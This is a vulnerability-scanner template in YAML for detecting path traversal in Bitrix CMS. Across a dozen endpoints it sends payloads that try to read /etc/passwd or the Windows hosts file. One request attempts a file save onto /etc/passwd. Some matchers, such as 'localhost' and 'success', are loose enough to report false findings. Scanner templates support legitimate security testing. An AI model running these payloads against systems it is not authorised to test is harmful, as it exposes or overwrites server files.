id: bitrix-path-traversal

info:
  name: Bitrix Path Traversal Vulnerabilities
  author: clevergod
  severity: high
  description: |
    Проверка Path Traversal уязвимостей в Bitrix CMS через различные эндпоинты
  tags: bitrix,path-traversal,directory-traversal,lfi

requests:
  # Path Traversal через imagepg.php
  - method: GET
    path:
      - "{{BaseURL}}/bitrix/tools/imagepg.php?img=../../../etc/passwd"
      - "{{BaseURL}}/bitrix/tools/imagepg.php?img=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
    matchers:
      - type: word
        name: path-traversal-imagepg
        words:
          - "root:"
          - "localhost"

  # Path Traversal через virtual_file_system.php
  - method: GET
    path:
      - "{{BaseURL}}/bitrix/tools/virtual_file_system.php?path=../../../etc/passwd"
      - "{{BaseURL}}/bitrix/tools/virtual_file_system.php?path=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
    matchers:
      - type: word
        name: path-traversal-vfs
        words:
          - "root:"
          - "localhost"

  # Path Traversal через html_editor_action.php
  - method: POST
    path:
      - "{{BaseURL}}/bitrix/tools/html_editor_action.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=save_file&path=../../../etc/passwd&content=test
    matchers:
      - type: word
        name: path-traversal-html-editor
        words:
          - "root:"
          - "success"

  # Path Traversal через компонент vote
  - method: GET
    path:
      - "{{BaseURL}}/bitrix/components/bitrix/vote.result.new/ajax.php?VOTE_ID=1&FILE=../../../etc/passwd"
    matchers:
      - type: word
        name: path-traversal-vote
        words:
          - "root:"

  # Path Traversal через компонент forum
  - method: GET
    path:
      - "{{BaseURL}}/bitrix/components/bitrix/forum.topic.list/ajax.php?FID=1&FILE=../../../etc/passwd"
    matchers:
      - type: word
        name: path-traversal-forum
        words:
          - "root:"

  # Path Traversal через компонент blog
  - method: GET
    path:
      - "{{BaseURL}}/bitrix/components/bitrix/blog.post.list/ajax.php?BLOG_ID=1&FILE=../../../etc/passwd"
    matchers:
      - type: word
        name: path-traversal-blog
        words:
          - "root:"

  # Path Traversal через компонент catalog
  - method: GET
    path:
      - "{{BaseURL}}/bitrix/components/bitrix/catalog.section.list/ajax.php?IBLOCK_ID=1&FILE=../../../etc/passwd"
    matchers:
      - type: word
        name: path-traversal-catalog
        words:
          - "root:"

  # Path Traversal через компонент sale
  - method: GET
    path:
      - "{{BaseURL}}/bitrix/components/bitrix/sale.basket.basket/ajax.php?PRODUCT_ID=1&FILE=../../../etc/passwd"
    matchers:
      - type: word
        name: path-traversal-sale
        words:
          - "root:"

  # Path Traversal через WebDAV
  - method: GET
    path:
      - "{{BaseURL}}/bitrix/webdav.php?path=../../../etc/passwd"
    matchers:
      - type: word
        name: path-traversal-webdav
        words:
          - "root:"

  # Path Traversal через updater
  - method: GET
    path:
      - "{{BaseURL}}/bitrix/modules/updater.log?file=../../../etc/passwd"
    matchers:
      - type: word
        name: path-traversal-updater
        words:
          - "root:"

  # Path Traversal через composite_data
  - method: GET
    path:
      - "{{BaseURL}}/bitrix/tools/composite_data.php?file=../../../etc/passwd"
    matchers:
      - type: word
        name: path-traversal-composite
        words:
          - "root:"

  # Path Traversal через site_checker
  - method: POST
    path:
      - "{{BaseURL}}/bitrix/tools/site_checker.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: |
      action=check&file=../../../etc/passwd
    matchers:
      - type: word
        name: path-traversal-site-checker
        words:
          - "root:" 